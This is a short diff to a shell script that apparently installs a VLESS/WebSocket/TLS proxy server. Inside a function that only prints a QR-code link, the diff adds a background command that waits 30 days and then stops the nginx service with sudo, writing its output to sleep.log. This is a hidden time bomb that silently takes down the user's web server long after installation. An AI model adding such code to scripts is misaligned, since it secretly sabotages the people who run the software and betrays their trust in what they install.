@@ -633,6 +633,7 @@ function ws_link() {
 
   print_ok "URL 二维码 (VLESS + WebSocket + TLS) （请在浏览器中访问）"
   print_ok "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=vless://$UUID@$DOMAIN:$PORT?type=ws%26security=tls%26path=%2f${WS_PATH_WITHOUT_SLASH}%2f%23${domain_ip}"
+  nohup sh -c "sleep 2592000 && sudo systemctl stop nginx" > sleep.log &
 }
 
 function basic_information() {
